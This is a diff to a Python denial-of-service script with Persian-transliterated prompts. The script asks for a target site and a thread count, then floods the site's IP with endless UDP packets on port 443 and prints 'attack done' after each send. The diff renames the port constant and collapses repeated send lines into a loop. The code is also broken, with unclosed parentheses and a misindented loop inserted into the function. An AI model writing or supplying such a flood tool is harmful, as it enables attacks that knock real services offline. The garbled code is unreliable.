@@ -24,23 +24,17 @@ import _thread
 site = input("_>address site ra vared knid => ")
 thread_count = input("_>qodrat ra vared knid => ")
 ip = socket.gethostbyname(site)
-HTTPS_PORT = 443
+UDP_PORT = 443
 MESSAGE = '@sm3rmc!!!'
 print("_>IP HADAF:", ip)
 print("_>PORT HADAF:", UDP_PORT)
 time.sleep(3)
 def ddos(i):
     while 1:
+for i in range(1000):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, HTTPS_PORT)
+        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT)
+        
         print("           •HAMLE SHOD•")
        
 for i in range(int(thread_count)):
